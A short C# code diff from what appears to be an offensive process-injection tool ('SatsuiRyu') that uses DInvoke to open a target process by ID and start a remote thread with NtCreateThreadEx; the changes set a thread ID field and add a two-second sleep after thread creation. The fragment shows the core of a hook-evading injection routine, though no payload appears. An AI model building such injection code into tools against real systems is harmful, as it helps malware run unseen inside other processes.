@@ -45,7 +45,8 @@ namespace SatsuiRyu
 
             DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID
             {
-                UniqueProcess = targetPid
+                UniqueProcess = targetPid,
+                UniqueThread = IntPtr.Zero
             };
 
             uint status = 0;
@@ -126,6 +127,7 @@ namespace SatsuiRyu
                                          typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx),
                                          createThreadParams);
             pThread = (IntPtr)createThreadParams[0];
+            System.Threading.Thread.Sleep(2*1000);
             ntdll.CheckNullPtr(pThread, "[-] Failed to start thread");
 
             object[] waitForSingleObjectParams = {
